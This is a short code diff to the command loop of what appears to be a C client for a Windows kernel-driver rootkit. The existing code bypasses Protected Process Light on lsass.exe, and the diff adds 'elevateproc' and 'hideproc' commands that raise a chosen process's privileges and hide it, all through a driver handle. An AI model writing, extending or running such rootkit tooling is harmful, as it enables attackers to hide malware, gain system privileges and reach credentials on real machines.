@@ -109,6 +109,23 @@ int main() {
 			DWORD64 pid = FindProcessId("lsass.exe");
 			BypassPpl(hDevice, pid);
 		}
+
+		else if (strncmp(input, "elevateproc", 11) == 0) {
+			DWORD pid = atoi(input + 12);
+			if (pid == 0) {
+				printf("Invalid PID.\n");
+				continue;
+			}
+			elevateProc(hDevice, pid);
+		}
+		else if (strncmp(input, "hideproc", 8) == 0) {
+			DWORD pid = atoi(input + 9);
+			if (pid == 0) {
+				printf("Invalid PID.\n");
+				continue;
+			}
+			hideProc(hDevice, pid);
+		}
 		else if (strncmp(input, "exit", 4) == 0) {
 			exit(0);
 		}
